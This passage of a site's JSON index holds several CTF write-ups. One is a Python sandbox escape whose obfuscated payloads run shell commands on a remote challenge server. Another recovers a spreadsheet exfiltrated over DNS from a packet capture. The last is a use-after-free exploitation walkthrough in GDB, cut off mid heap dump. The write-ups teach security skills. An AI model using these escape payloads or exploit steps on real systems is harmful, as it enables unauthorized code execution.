'functools._lru_cache_wrapper'\u0026gt;, \u0026lt;class 'functools.KeyWrapper'\u0026gt;, \u0026lt;class 'functools._lru_list_elem'\u0026gt;, \u0026lt;class 'functools.partialmethod'\u0026gt;, \u0026lt;class 'functools.singledispatchmethod'\u0026gt;, \u0026lt;class 'functools.cached_property'\u0026gt;, \u0026lt;class 'contextlib.ContextDecorator'\u0026gt;, \u0026lt;class 'contextlib.AsyncContextDecorator'\u0026gt;, \u0026lt;class 'contextlib._GeneratorContextManagerBase'\u0026gt;, \u0026lt;class 'contextlib._BaseExitStack'\u0026gt;, \u0026lt;class 'enum.auto'\u0026gt;, \u0026lt;enum 'Enum'\u0026gt;, \u0026lt;class 're.Pattern'\u0026gt;, \u0026lt;class 're.Match'\u0026gt;, \u0026lt;class '_sre.SRE_Scanner'\u0026gt;, \u0026lt;class 'sre_parse.State'\u0026gt;, \u0026lt;class 'sre_parse.SubPattern'\u0026gt;, \u0026lt;class 'sre_parse.Tokenizer'\u0026gt;, \u0026lt;class 're.Scanner'\u0026gt;, \u0026lt;class 'ast.AST'\u0026gt;, \u0026lt;class 'ast.NodeVisitor'\u0026gt;, \u0026lt;class 'typing._Final'\u0026gt;, \u0026lt;class 'typing._Immutable'\u0026gt;, \u0026lt;class 'typing._TypeVarLike'\u0026gt;, \u0026lt;class 'typing.Generic'\u0026gt;, \u0026lt;class 'typing._TypingEmpty'\u0026gt;, \u0026lt;class 'typing._TypingEllipsis'\u0026gt;, \u0026lt;class 'typing.Annotated'\u0026gt;, \u0026lt;class 'typing.NamedTuple'\u0026gt;, \u0026lt;class 'typing.TypedDict'\u0026gt;, \u0026lt;class 'typing.NewType'\u0026gt;, \u0026lt;class 'typing.io'\u0026gt;, \u0026lt;class 'typing.re'\u0026gt;]}  The os module can be found at index 137:\n$ python3 util.py Welcome to SafetyCalc (tm)! Note: SafetyCorp are not liable for any accidents that may occur while using SafetyCalc \u0026gt; {1: getattr(getattr(getattr((), '\\x5f\\x5fclass\\x5f\\x5f'), '\\x5f\\x5fbase\\x5f\\x5f'), '\\x5f\\x5fsubclasses\\x5f\\x5f')()[137]} {1: \u0026lt;class 'os._wrap_close'\u0026gt;}  At this point, we can use the following payload:\n[ x.__init__.__globals__ forxin''.__class__.__base__.__subclasses__() if\"'os.\"instr(x) ][0]['system']('ls')  Basically, call (\u0026lt;class 'os._wrap_close'\u0026gt;).__init__.__globals__['system']('ls'). Adapted to our situation:\n$ python3 util.py \u0026gt; {1: getattr(getattr(getattr(getattr(getattr((), '\\x5f\\x5fclass\\x5f\\x5f'), '\\x5f\\x5fbase\\x5f\\x5f'), '\\x5f\\x5fsubclasses\\x5f\\x5f')()[137], '\\x5f\\x5finit\\x5f\\x5f'), '\\x5f\\x5fglobals\\x5f\\x5f')['system']('whoami')} rocky {1: 0}  Alright, let\u0026rsquo;s try it on the remote instance:\n$ nc 64.227.43.55 30570 Welcome to SafetyCalc (tm)! Note: SafetyCorp are not liable for any accidents that may occur while using SafetyCalc \u0026gt; {1: getattr(getattr(getattr(getattr(getattr((), '\\x5f\\x5fclass\\x5f\\x5f'), '\\x5f\\x5fbase\\x5f\\x5f'), '\\x5f\\x5fsubclasses\\x5f\\x5f')()[137], '\\x5f\\x5finit\\x5f\\x5f'), '\\x5f\\x5fglobals\\x5f\\x5f')['system']('whoami')} Something bad happened! 'wrapper_descriptor' object has no attribute '__globals__' \u0026gt; ^C  It seems that it is not working. Curiously, if we enumerate the subclasses again, we will see that os is at index 138. Hence, we only need to update this value and we have Remote Code Execution to capture the flag:\n$ nc 64.227.43.55 30570 Welcome to SafetyCalc (tm)! Note: SafetyCorp are not liable for any accidents that may occur while using SafetyCalc \u0026gt; {1: getattr(getattr(getattr((), '\\x5f\\x5fclass\\x5f\\x5f'), '\\x5f\\x5fbase\\x5f\\x5f'), '\\x5f\\x5fsubclasses\\x5f\\x5f')()[138]} {1: \u0026lt;class 'os._wrap_close'\u0026gt;} \u0026gt; {1: getattr(getattr(getattr(getattr(getattr((), '\\x5f\\x5fclass\\x5f\\x5f'), '\\x5f\\x5fbase\\x5f\\x5f'), '\\x5f\\x5fsubclasses\\x5f\\x5f')()[138], '\\x5f\\x5finit\\x5f\\x5f'), '\\x5f\\x5fglobals\\x5f\\x5f')['system']('whoami')} ctf {1: 0} \u0026gt; {1: getattr(getattr(getattr(getattr(getattr((), '\\x5f\\x5fclass\\x5f\\x5f'), '\\x5f\\x5fbase\\x5f\\x5f'), '\\x5f\\x5fsubclasses\\x5f\\x5f')()[138], '\\x5f\\x5finit\\x5f\\x5f'), '\\x5f\\x5fglobals\\x5f\\x5f')['system']('ls')} app bin boot dev etc flag.txt home lib lib64 media mnt opt proc root run sbin srv sys tmp usr var {1: 0} \u0026gt; {1: getattr(getattr(getattr(getattr(getattr((), '\\x5f\\x5fclass\\x5f\\x5f'), '\\x5f\\x5fbase\\x5f\\x5f'), '\\x5f\\x5fsubclasses\\x5f\\x5f')()[138], '\\x5f\\x5finit\\x5f\\x5f'), '\\x5f\\x5fglobals\\x5f\\x5f')['system']('cat flag.txt')} HTB{45ts_are_pretty_c00l!!!} {1: 0}  ","image":"/images/misc.png","permalink":"https://7rocky.github.io/en/ctf/htb-challenges/misc/tree-of-danger/","section":"ctf","summary":"Static Code Analysis. Python sandbox escape","time":6,"title":"Tree of Danger"},{"contents":"We are given a network traffic capture file called capture.pcap.\nTraffic analysis We can use Wireshark to analyze it:\nDNS queries All packets are DNS queries (and responses). The thing that stands out is the subdomain: all queries ask for hex-data.pumpkincorp.com.\nIf we filter by the hexadecimal data on the capture.pcap, we will have this:\n$ strings capture.pcap | grep -E '[0-9a-f]{32,}' | head 2504b0304140008080800a52c47550000000000000000000000 2504b0304140008080800a52c47550000000000000000000000 20018000000786c2f64726177696e67732f64726177696e6731 20018000000786c2f64726177696e67732f64726177696e6731 22e786d6c9dd05d6ec2300c07f013ec0e55de695a181343145e 22e786d6c9dd05d6ec2300c07f013ec0e55de695a181343145e 2d04e300ee0256e1b918fca0ea3dc7ed14a36697b011e6dcb3f 2d04e300ee0256e1b918fca0ea3dc7ed14a36697b011e6dcb3f 2f9efcd6e74b6f84462137c23eab212057a15b4f15d230eef6f 2f9efcd6e74b6f84462137c23eab212057a15b4f15d230eef6f  Notice that all lines start by 2, which is not part of the subdomain (check the previous image), so we need to get rid of it:\n$ strings capture.pcap | grep -E '[0-9a-f]{32,}' | sed s/^2//g | head 504b0304140008080800a52c47550000000000000000000000 504b0304140008080800a52c47550000000000000000000000 0018000000786c2f64726177696e67732f64726177696e6731 0018000000786c2f64726177696e67732f64726177696e6731 2e786d6c9dd05d6ec2300c07f013ec0e55de695a181343145e 2e786d6c9dd05d6ec2300c07f013ec0e55de695a181343145e d04e300ee0256e1b918fca0ea3dc7ed14a36697b011e6dcb3f d04e300ee0256e1b918fca0ea3dc7ed14a36697b011e6dcb3f f9efcd6e74b6f84462137c23eab212057a15b4f15d230eef6f f9efcd6e74b6f84462137c23eab212057a15b4f15d230eef6f  Another thing to care about is that we have repeated lines. We can use uniq to get rid of repeated data:\n$ strings capture.pcap | grep -E '[0-9a-f]{32,}' | sed s/^2//g | uniq | head 504b0304140008080800a52c47550000000000000000000000 0018000000786c2f64726177696e67732f64726177696e6731 2e786d6c9dd05d6ec2300c07f013ec0e55de695a181343145e d04e300ee0256e1b918fca0ea3dc7ed14a36697b011e6dcb3f f9efcd6e74b6f84462137c23eab212057a15b4f15d230eef6f b395283882d76083c7465c90c56efbb41935adcfbca722ed7b 5ea7b2117d8cc35a4a563d3ae0320ce8d3b40de420a6923aa9 09ce497656ceabea45f240089a7bc4b89f26e2eac1039a03e3 f3fe4dd784b6350af7419d1cfa3821841662fa05f766e0aca9 07ae513d50fc01c67f82338a028736962ab8eb29d94842fd3c  If we convert the hexadecimal data into bytes with xxd and pipe the output into file, we will see that it is a Microsoft Excel document:\n$ strings capture.pcap | grep -E '[0-9a-f]{32,}' | sed s/^2//g | uniq | xxd -r -p | file - /dev/stdin: Microsoft Excel 2007+ $ strings capture2.pcap | grep -E '[0-9a-f]{32,}' | sed s/^2//g | uniq | xxd -r -p \u0026gt; file.xlsx  Microsoft Office data extraction The file is somewhat corrupted, but we can still inspect it. For your information, any Microsoft Office document is actually a ZIP file (mind the magic bytes):\n$ xxd file.xlsx | head 00000000: 504b 0304 1400 0808 0800 a52c 4755 0000 PK.........,GU.. 00000010: 0000 0000 0000 0000 0000 1800 0000 786c ..............xl 00000020: 2f64 7261 7769 6e67 732f 6472 6177 696e /drawings/drawin 00000030: 6731 2e78 6d6c 9dd0 5d6e c230 0c07 f013 g1.xml..]n.0.... 00000040: ec0e 55de 695a 1813 4314 5ed0 4e30 0ee0 ..U.iZ..C.^.N0.. 00000050: 256e 1b91 8fca 0ea3 dc7e d14a 3669 7b01 %n.......~.J6i{. 00000060: 1e6d cb3f f9ef cd6e 74b6 f844 6213 7c23 .m.?...nt..Db.|# 00000070: eab2 1205 7a15 b4f1 5d23 0eef 6fb3 9528 ....z...]#..o..( 00000080: 3882 d760 83c7 465c 90c5 6efb b419 35ad 8..`..F\\..n...5. 00000090: cfbc a722 ed7b 5ea7 b211 7d8c c35a 4a56 ...\".{^...}..ZJV  With unzip it is still corrupted, but we can use 7z:\n$ cp file.xlsx file.zip $ unzip -l file.zip Archive: file.zip End-of-central-directory signature not found. Either this file is not a zipfile, or it constitutes one disk of a multi-part archive. In the latter case the central directory and zipfile comment will be found on the last disk(s) of this archive. unzip: cannot find zipfile directory in one of file.zip or file.zip.zip, and cannot find file.zip.ZIP, period. $ 7z l file.zip 7-Zip [64] 17.04 : Copyright (c) 1999-2021 Igor Pavlov : 2017-08-28 p7zip Version 17.04 (locale=utf8,Utf16=on,HugeFiles=on,64 bits,8 CPUs LE) Scanning the drive for archives: 1 file, 7675 bytes (8 KiB) Listing archive: file.zip -- Path = file.zip Type = zip ERRORS: Unexpected end of archive Physical Size = 7675 Characteristics = Local Date Time Attr Size Compressed Name ------------------- ----- ------------ ------------ ------------------------ 2022-10-07 05:37:10 ..... 775 261 xl/drawings/drawing1.xml 2022-10-07 05:37:10 ..... 775 261 xl/drawings/drawing2.xml 2022-10-07 05:37:10 ..... 6170 1645 xl/worksheets/sheet1.xml 2022-10-07 05:37:10 ..... 298 179 xl/worksheets/_rels/sheet1.xml.rels 2022-10-07 05:37:10 ..... 3106 939 xl/worksheets/sheet2.xml 2022-10-07 05:37:10 ..... 298 180 xl/worksheets/_rels/sheet2.xml.rels 2022-10-07 05:37:10 ..... 853 405 xl/sharedStrings.xml 2022-10-07 05:37:10 ..... 10676 1081 xl/styles.xml 2022-10-07 05:37:10 ..... 874 347 xl/workbook.xml 2022-10-07 05:37:10 ..... 706 226 xl/_rels/workbook.xml.rels 2022-10-07 05:37:10 ..... 296 178 _rels/.rels 2022-10-07 05:37:10 ..... 1192 308 [Content_Types].xml ------------------- ----- ------------ ------------ ------------------------ 2022-10-07 05:37:10 26019 6010 12 files Errors: 1  Therefore, let\u0026rsquo;s uncompress it:\n$ mkdir file $ cd file $ mv ../file.zip . $ 7z x file.zip 7-Zip [64] 17.04 : Copyright (c) 1999-2021 Igor Pavlov : 2017-08-28 p7zip Version 17.04 (locale=utf8,Utf16=on,HugeFiles=on,64 bits,8 CPUs LE) Scanning the drive for archives: 1 file, 7675 bytes (8 KiB) Extracting archive: file.zip ERRORS: Unexpected end of archive -- Path = file.zip Type = zip ERRORS: Unexpected end of archive Physical Size = 7675 Characteristics = Local Archives with Errors: 1 Open Errors: 1  Flag Now we can search for the flag using grep, and there it is:\n$ grep -r HTB . \u0026lt;sst xmlns=\"http://schemas.openxmlformats.org/spreadsheetml/2006/main\" count=\"28\" uniqueCount=\"22\"\u0026gt;\u0026lt;si\u0026gt;\u0026lt;t\u0026gt;Recipe Assignment\u0026lt;/t\u0026gt;\u0026lt;/si\u0026gt;\u0026lt;si\u0026gt;\u0026lt;t\u0026gt;In this sheet there are assigned the ingredients of the punken pun secret project.\u0026lt;/t\u0026gt;\u0026lt;/si\u0026gt;\u0026lt;si\u0026gt;\u0026lt;t\u0026gt;Subject\u0026lt;/t\u0026gt;\u0026lt;/si\u0026gt;\u0026lt;si\u0026gt;\u0026lt;t\u0026gt;Assignment\u0026lt;/t\u0026gt;\u0026lt;/si\u0026gt;\u0026lt;si\u0026gt;\u0026lt;t\u0026gt;Status\u0026lt;/t\u0026gt;\u0026lt;/si\u0026gt;\u0026lt;si\u0026gt;\u0026lt;t\u0026gt;Time\u0026lt;/t\u0026gt;\u0026lt;/si\u0026gt;\u0026lt;si\u0026gt;\u0026lt;t\u0026gt;Start date\u0026lt;/t\u0026gt;\u0026lt;/si\u0026gt;\u0026lt;si\u0026gt;\u0026lt;t\u0026gt;Due on\u0026lt;/t\u0026gt;\u0026lt;/si\u0026gt;\u0026lt;si\u0026gt;\u0026lt;t\u0026gt;Andrew\u0026lt;/t\u0026gt;\u0026lt;/si\u0026gt;\u0026lt;si\u0026gt;\u0026lt;t\u0026gt;1 Fillet of a fenny snake\u0026lt;/t\u0026gt;\u0026lt;/si\u0026gt;\u0026lt;si\u0026gt;\u0026lt;t\u0026gt;In progress\u0026lt;/t\u0026gt;\u0026lt;/si\u0026gt;\u0026lt;si\u0026gt;\u0026lt;t\u0026gt;Nick\u0026lt;/t\u0026gt;\u0026lt;/si\u0026gt;\u0026lt;si\u0026gt;\u0026lt;t\u0026gt;3 Lizard’s legs\u0026lt;/t\u0026gt;\u0026lt;/si\u0026gt;\u0026lt;si\u0026gt;\u0026lt;t\u0026gt;Not started\u0026lt;/t\u0026gt;\u0026lt;/si\u0026gt;\u0026lt;si\u0026gt;\u0026lt;t\u0026gt;3 Bat wings\u0026lt;/t\u0026gt;\u0026lt;/si\u0026gt;\u0026lt;si\u0026gt;\u0026lt;t\u0026gt;Mike\u0026lt;/t\u0026gt;\u0026lt;/si\u0026gt;\u0026lt;si\u0026gt;\u0026lt;t\u0026gt;3 Halloween chips\u0026lt;/t\u0026gt;\u0026lt;/si\u0026gt;\u0026lt;si\u0026gt;\u0026lt;t\u0026gt;Done\u0026lt;/t\u0026gt;\u0026lt;/si\u0026gt;\u0026lt;si\u0026gt;\u0026lt;t\u0026gt;HTB{M4g1c_c4nn0t_pr3v3nt_d4t4_br34ch}\u0026lt;/t\u0026gt;\u0026lt;/si\u0026gt;\u0026lt;si\u0026gt;\u0026lt;t\u0026gt;Skipped\u0026lt;/t\u0026gt;\u0026lt;/si\u0026gt;\u0026lt;si\u0026gt;\u0026lt;t\u0026gt;Team Members\u0026lt;/t\u0026gt;\u0026lt;/si\u0026gt;\u0026lt;si\u0026gt;\u0026lt;t\u0026gt;Member of the Punkenpun project.\u0026lt;/t\u0026gt;\u0026lt;/si\u0026gt;\u0026lt;/sst\u0026gt; $ grep -r HTB . | grep -oE 'HTB{.*?}' HTB{M4g1c_c4nn0t_pr3v3nt_d4t4_br34ch}  ","image":"/images/forensics.png","permalink":"https://7rocky.github.io/en/ctf/other/hackthebooctf/trick-or-breach/","section":"ctf","summary":"Microsoft Office document internals","time":4,"title":"Trick or Breach"},{"contents":"We are given a 32-bit binary called vuln:\nArch: i386-32-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x8048000)  We also have the C source code:\n#include \u0026lt;stdint.h\u0026gt; #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;fcntl.h\u0026gt; #include \u0026lt;ctype.h\u0026gt; #define FLAG_BUFFER 200 #define LINE_BUFFER_SIZE 20 typedef struct { uintptr_t (*whatToDo)(); char *username; } cmd; char choice; cmd *user; void hahaexploitgobrrr() { char buf[FLAG_BUFFER]; FILE *f = fopen(\"flag.txt\", \"r\"); fgets(buf, FLAG_BUFFER, f); fprintf(stdout, \"%s\\n\", buf); fflush(stdout); } char* getsline() { getchar(); char *line = malloc(100), *linep = line; size_t lenmax = 100, len = lenmax; int c; if (line == NULL) return NULL; for (;;) { c = fgetc(stdin); if (c == EOF) break; if (--len == 0) { len = lenmax; char *linen = realloc(linep, lenmax *= 2); if (linen == NULL) { free(linep); return NULL; } line = linen + (line - linep); linep = linen; } if ((*line++ = c) == '\\n') break; } *line = '\\0'; return linep; } void doProcess(cmd* obj) { (*obj-\u0026gt;whatToDo)(); } void s() { printf(\"OOP! Memory leak...%p\\n\", hahaexploitgobrrr); puts(\"Thanks for subsribing! I really recommend becoming a premium member!\"); } void p() { puts(\"Membership pending... (There's also a super-subscription you can also get for twice the price!)\"); } void m() { puts(\"Account created.\"); } void leaveMessage() { puts(\"I only read premium member messages but you can \"); puts(\"try anyways:\"); char* msg = (char*) malloc(8); read(0, msg, 8); } void i() { char response; puts(\"You're leaving already(Y/N)?\"); scanf(\" %c\", \u0026amp;response); if (toupper(response) == 'Y') { puts(\"Bye!\"); free(user); } else { puts(\"Ok. Get premium membership please!\"); } } void printMenu() { puts(\"Welcome to my stream! ^W^\"); puts(\"==========================\"); puts(\"(S)ubscribe to my channel\"); puts(\"(I)nquire about account deletion\"); puts(\"(M)ake an Twixer account\"); puts(\"(P)ay for premium membership\"); puts(\"(l)eave a message(with or without logging in)\"); puts(\"(e)xit\"); } void processInput() { scanf(\" %c\", \u0026amp;choice); choice = toupper(choice); switch (choice) { case 'S': if (user) { user-\u0026gt;whatToDo = (void*) s; } else { puts(\"Not logged in!\"); } break; case 'P': user-\u0026gt;whatToDo = (void*) p; break; case 'I': user-\u0026gt;whatToDo = (void*) i; break; case 'M': user-\u0026gt;whatToDo = (void*) m; puts(\"===========================\"); puts(\"Registration: Welcome to Twixer!\"); puts(\"Enter your username: \"); user-\u0026gt;username = getsline(); break; case 'L': leaveMessage(); break; case 'E': exit(0); default: puts(\"Invalid option!\"); exit(1); } } int main() { setbuf(stdout, NULL); user = (cmd*) malloc(sizeof(user)); while (1) { printMenu(); processInput(); doProcess(user); } return 0; }  Basically, the program has four functionalities:\n Leak the address of the function hahaexploitgobrrr (S) Add an account (M) Delete an account (I) Leave a message (L)  The key here is that the user variable can be reset using free, but the pointer to the variable is not changed. Moreover, the message (L) is saved again in the heap calling malloc.\nHence, if we create an account (M), then we delete it (I) using free and after that we send a message (L) using malloc, the pointer to user will point to the message, because malloc will reuse the address of recently released memory.\nThe user structure is made of:\ntypedef struct { uintptr_t (*whatToDo)(); char *username; } cmd;  It has a pointer to a function (whatToDo) and a pointer to a string (username), so the size of the structure is 8 bytes.\nDepending on the input we provide, the pointer of the function changes to s, i, m, p or leaveMessage. Then, the function doProcess is called:\nvoid doProcess(cmd* obj) { (*obj-\u0026gt;whatToDo)(); }  Which calls the function pointed by whatToDo.\nAll of the process is executed inside an endless loop:\nint main() { setbuf(stdout, NULL); user = (cmd*) malloc(sizeof(user)); while (1) { printMenu(); processInput(); doProcess(user); } return 0; }  Let\u0026rsquo;s recall the strategy:\n Leak the address of the function hahaexploitgobrrr (S) Create an account (M) Delete the account (I) Leave a message (L) to overwrite whatToDo with the address of hahaexploitgobrrr  These are the involved functions:\nvoid s() { printf(\"OOP! Memory leak...%p\\n\", hahaexploitgobrrr); puts(\"Thanks for subsribing! I really recommend becoming a premium member!\"); } void leaveMessage() { puts(\"I only read premium member messages but you can \"); puts(\"try anyways:\"); char* msg = (char*) malloc(8); read(0, msg, 8); } void i() { char response; puts(\"You're leaving already(Y/N)?\"); scanf(\" %c\", \u0026amp;response); if (toupper(response) == 'Y') { puts(\"Bye!\"); free(user); } else { puts(\"Ok. Get premium membership please!\"); } }  As shown above, s just prints the address of hahaexploitgobrrr:\n$ ./vuln Welcome to my stream! ^W^ ========================== (S)ubscribe to my channel (I)nquire about account deletion (M)ake an Twixer account (P)ay for premium membership (l)eave a message(with or without logging in) (e)xit S OOP! Memory leak...0x80487d6 Thanks for subsribing! I really recommend becoming a premium member!  Then, leaveMessage reads 8 bytes and allocates them in the heap using malloc. And finally, i removes the memory allocation for the user structure using free (but the pointer and the data is kept).\nThe process of creating an account is inside the corresponding case of processInput:\ncase 'M': user-\u0026gt;whatToDo = (void*) m; puts(\"===========================\"); puts(\"Registration: Welcome to Twixer!\"); puts(\"Enter your username: \"); user-\u0026gt;username = getsline(); break;  The function getsline can take a lot of user input, but I reckon there is no overflow vulnerability here.\nLet\u0026rsquo;s test our idea with GDB (skipping the address leakage):\n$ gdb -q vuln Reading symbols from vuln... (No debugging symbols found in vuln) gef➤ break printMenu Breakpoint 1 at 0x8048b31 gef➤ run Starting program: ./vuln Breakpoint 1, 0x8048b31 in printMenu ()  gef➤ continue Continuing. Starting program: ./vuln Welcome to my stream! ^W^ ========================== (S)ubscribe to my channel (I)nquire about account deletion (M)ake an Twixer account (P)ay for premium membership (l)eave a message(with or without logging in) (e)xit M =========================== Registration: Welcome to Twixer! Enter your username: AAA Account created. Breakpoint 1, 0x8048b31 in printMenu ()  Let\u0026rsquo;s check the address of the heap space:\ngef➤ vmmap [ Legend: Code | Heap | Stack ] Start End Offset Perm Path 0x08048000 0x0804a000 0x00000000 r-x ./vuln 0x0804a000 0x0804b000 0x00001000 r-- ./vuln 0x0804b000 0x0804c000 0x00002000 rw- ./vuln 0x0804c000 0x0806e000 0x00000000 rw- [heap] 0xf7dcd000 0xf7dea000 0x00000000 r-- /usr/lib32/libc-2.31.so 0xf7dea000 0xf7f42000 0x0001d000 r-x /usr/lib32/libc-2.31.so 0xf7f42000 0xf7fb2000 0x00175000 r-- /usr/lib32/libc-2.31.so 0xf7fb2000 0xf7fb4000 0x001e4000 r-- /usr/lib32/libc-2.31.so 0xf7fb4000 0xf7fb6000 0x001e6000 rw- /usr/lib32/libc-2.31.so 0xf7fb6000 0xf7fb8000 0x00000000 rw- 0xf7fc9000 0xf7fcb000 0x00000000 rw- 0xf7fcb000 0xf7fcf000 0x00000000 r-- [vvar] 0xf7fcf000 0xf7fd1000 0x00000000 r-x [vdso] 0xf7fd1000 0xf7fd2000 0x00000000 r-- /usr/lib32/ld-2.31.so 0xf7fd2000 0xf7ff0000 0x00001000 r-x /usr/lib32/ld-2.31.so 0xf7ff0000 0xf7ffb000 0x0001f000 r-- /usr/lib32/ld-2.31.so 0xf7ffc000 0xf7ffd000 0x0002a000 r-- /usr/lib32/ld-2.31.so 0xf7ffd000 0xf7ffe000 0x0002b000 rw- /usr/lib32/ld-2.31.so 0xfffdd000 0xffffe000 0x00000000 rw- [stack]  Now we can examine some values on the heap:\ngef➤ x/120x 0x0804c000 0x804c000:\t0x00000000\t0x00000000\t0x00000000\t0x00000191 0x804c010:\t0x00000000\t0x00000000\t0x00000000\t0x00000000 0x804c020:\t0x00000000\t0x00000000\t0x00000000\t0x00000000 0x804c030:\t0x00000000\t0x00000000\t0x00000000\t0x00000000 0x804c040:\t0x00000000\t0x00000000\t0x00000000\t0x00000000 0x804c050:\t0x00000000\t0x00000000\t0x00000000\t0x00000000 0x804c060:\t0x00000000\t0x00000000\t0x00000000\t0x00000000 0x804c070:\t0x00000000\t0x00000000\t0x00000000\t0x00000000 0x804c080:\t0x00000000\t0x00000000\t0x00000000\t0x00000000 0x804c090:\t0x00000000\t0x00000000\t0x00000000\t0x00000000 0x804c0a0:\t0x00000000\t0x00000000\t0x00000000\t0x00000000 0x804c0b0:\t0x00000000\t0x00000000\t0x00000000\t0x00000000 0x804c0c0:\t0x00000000\t0x00000000\t0x00000000\t0x00000000 0x804c0d0:\t0x00000000\t0x00000000\t0x00000000\t0x00000000 0x804c0e0:\t0x00000000\t0x00000000\t0x00000000\t0x00000000 0x804c0f0:\t0x00000000\t0x00000000\t0x00000000\t0x00000000 0x804c100:\t0x00000000\t0x00000000\t0x00000000\t0x00000000 0x804c110:\t0x00000000\t0x00000000\t0x00000000\t0x00000000 0x804c120:\t0x00000000\t0x00000000\t0x00000000\t0x00000000 0x804c130:\t0x00000000\t0x00000000\t0x00000000\t0x00000000 0x804c140:\t0x00000000\t0x00000000\t0x00000000\t0x00000000 0x804c150:\t0x00000000\t0x00000000\t0x00000000\t0x00000000 0x804c160:\t0x00000000\t0x00000000\t0x00000000\t0x00000000 0x804c170:\t0x00000000\t0x00000000\t0x00000000\t0x00000000 0x804c180:\t0x00000000\t0x00000000\t0x00000000\t0x00000000 0x804c190:\t0x00000000\t0x00000000\t0x00000000\t0x00000011 0x804c1a0:\t0x080489f6\t0x0804c5c0\t0x00000000\t0x00000411 0x804c1b0:\t0x0a414141\t0x00000000\t0x00000000\t0x00000000 0x804c1c0:\t0x00000000\t0x00000000\t0x00000000\t0x00000000 0x804c1d0:\t0x00000000\t0x00000000\t0x00000000\t0x00000000  Notice how 0x080489f6 is the address of m:\ngef➤ x 0x080489f6 0x80489f6 \u0026lt;m\u0026gt;:\t0x53e58955  And 0x0804c5c0 is the address of the string AAA:\ngef➤ x/16x 0x0804c5c0 - 0x10 0x804c5b0:\t0x00000000\t0x00000000\t0x00000000\t0x00000071 0x804c5c0:\t0x0a414141\t0x00000000\t0x00000000\t0x00000000 0x804c5d0:\t0x00000000\t0x00000000\t0x00000000\t0x00000000 0x804c5e0:\t0x00000000\t0x00000000\t0x00000000\t0x00000000  Moreover, we can find the string AAA right below the address of m, but let\u0026rsquo;s leave it there.\nNow, we delete the account using free:\ngef➤ continue Continuing. Welcome to my stream! ^W^ ========================== (S)ubscribe to my channel (I)nquire about account deletion (M)ake an Twixer account (P)ay for premium membership (l)eave a message(with or without logging in) (e)xit I You're leaving already(Y/N)? Y Bye! Breakpoint 1, 0x8048b31 in printMenu ()  Let\u0026rsquo;s check the heap again:\ngef➤ x/120x 0x0804c000 0x804c000:\t0x00000000\t0x00000000\t0x00000000\t0x00000191 0x804c010:\t0x00000001\t0x00000000\t0x00000000\t0x00000000 0x804c020:\t0x00000000\t0x00000000\t0x00000000\t0x00000000 0x804c030:\t0x00000000\t0x00000000\t0x00000000\t0x00000000 0x804c040:\t0x00000000\t0x00000000\t0x00000000\t0x00000000 0x804c050:\t0x00000000\t0x00000000\t0x00000000\t0x00000000 0x804c060:\t0x00000000\t0x00000000\t0x00000000\t0x00000000 0x804c070:\t0x00000000\t0x00000000\t0x00000000\t0x00000000 0x804c080:\t0x00000000\t0x00000000\t0x00000000\t0x00000000 0x804c090:\t0x0804c1a0\t0x00000000\t0x00000000\t0x00000000 0x804c0a0:\t0x00000000\t0x00000000\t0x00000000\t0x00000000 0x804c0b0:\t0x00000000\t0x00000000\t0x00000000\t0x00000000 0x804c0c0:\t0x00000000\t0x00000000\t0x00000000\t0x00000000 0x804c0d0:\t0x00000000\t0x00000000\t0x00000000\t0x00000000 0x804c0e0:\t0x00000000\t0x00000000\t0x00000000\t0x00000000 0x804c0f0:\t0x00000000\t0x00000000\t0x00000000\t0x00000000 0x804c100:\t0x00000000\t0x00000000\t0x00000000\t0x00000000 0x804c110:\t0x00000000\t0x00000000\t0x00000000\t0x00000000 0x804c120:\t0x00000000\t0x00000000\t0x00000000\t0x00000000 0x804c130:\t0x00000000\t0x00000000\t0x00000000\t0x00000000 0x804c140:\t0x00000000\t0x00000000\t0x00000000\t0x00000000 0x804c150:\t0x00000000\t0x00000000\t0x00000000\t0x00000000 0x804c160:\t0x00000000\t0x00000000\t0x00000000\t0x00000000 0x804c170:\t0x00000000\t0x00000000\t0x00000000\t0x00000000 0x804c180:\t0x00000000\t0x00000000\t0x00000000\t0x00000000 0x804c190:\t0x00000000\t0x00000000\t0x00000000\t0x00000011 0x804c1a0:\t0x00000000\t0x0804c010\t0x00000000\t0x00000411 0x804c1b0:\t0x0a410a59\t0x00000000\t0x00000000\t0x00000000 0x804c1c0:\t0x00000000\t0x00000000\t0x00000000\t0x00000000 0x804c1d0:\t0x00000000\t0x00000000\t0x00000000\t0x00000000  If you look this heap status compared to the previous one, you will notice these diferences:\n There is a value 0x00000001 at address 0x804c010 There is a value 0x0804c1a0 at address 0x804c090. This value is the pointer to the user variable (it is also on the heap) There is a value 0x00000000 at address 0x804c1a0, which is the value of the pointer whatToDo (now it is empty) There is a value 0x0804c010 at address 0x804c1a0, which is the pointer to the username. But there is no string here, it is pointing to the address on the first bullet point:  gef➤ x/16x 0x0804c010 - 0x10 0x804c000:\t0x00000000\t0x00000000\t0x00000000\t0x00000191 0x804c010:\t0x00000001\t0x00000000\t0x00000000\t0x00000000 0x804c020:\t0x00000000\t0x00000000\t0x00000000\t0x00000000 0x804c030:\t0x00000000\t0x00000000\t0x00000000\t0x00000000  Let\u0026rsquo;s continue and leave a message:\ngef➤ continue Continuing. Welcome to my stream! ^W^ ========================== (S)ubscribe to my channel (I)nquire about account deletion (M)ake an Twixer account (P)ay for premium membership (l)eave a message(with or without logging in) (e)xit L I only read premium member messages but you can try anyways: AAAABBB Program received signal SIGSEGV, Segmentation fault. 0x41414141 in ?? ()  Alright, we have redirected code execution and we have control over the next address to call (in this case AAAA or 0x41414141).\nLet\u0026rsquo;s examine the heap one more time:\ngef➤ x/120x 0x0804c000 0x804c000:\t0x00000000\t0x00000000\t0x00000000\t0x00000191 0x804c010:\t0x00000000\t0x00000000\t0x00000000\t0x00000000 0x804c020:\t0x00000000\t0x00000000\t0x00000000\t0x00000000 0x804c030:\t0x00000000\t0x00000000\t0x00000000\t0x00000000 0x804c040:\t0x00000000\t0x00000000\t0x00000000\t0x00000000 0x804c050:\t0x00000000\t0x00000000\t0x00000000\t0x00000000 0x804c060:\t0x00000000\t0x00000000\t0x00000000\t0x00000000 0x804c070:\t0x00000000\t0x00000000\t0x00000000\t0x00000000 0x804c080:\t0x00000000\t0x00000000\t0x00000000\t0x00000000 0x804c090:\t0x00000000\t0x00000000\t0x00000000\t0x00000000 0x804c0a0:\t0x00000000\t0x00000000\t0x00000000\t0x00000000 